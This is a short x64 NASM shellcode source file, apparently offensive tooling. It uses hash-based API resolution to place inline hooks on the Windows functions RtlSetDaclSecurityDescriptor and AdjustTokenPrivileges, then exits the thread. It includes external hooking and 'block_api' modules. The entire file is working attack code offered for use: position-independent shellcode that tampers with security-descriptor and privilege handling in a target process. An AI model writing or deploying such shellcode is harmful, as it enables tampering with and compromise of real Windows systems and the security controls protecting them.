[BITS 64]
	
	cld                             ; Clear direction flags
	call get_hook_api               ; Get the address of inline_hook_api.asm to stack
	%include "inline_hook.asm"      ; https://github.com/egebalci/Hook_API
get_hook_api:                       ;
	pop rbp                         ; Pop out the address of inline_hook_api.asm to EBP
	mov r10d,0xE57FF92D             ; hash("NTDLL.dll", "RtlSetDaclSecurityDescriptor")
	call rbp                        ; hook("RtlSetDaclSecurityDescriptor")
	mov r10d,0x330A1F75             ; hash("ADVAPI32.dll", "AdjustTokenPrivileges")
	call rbp
	call get_block_api              ; 	
	incbin "block_api"              ; nasm -f bin block_api.asm
get_block_api:                      ;
	pop rbp                         ; Pop out the block_api address to EBP
	%include "block_exitfunk.asm"   ; Exit the thread accordingly	

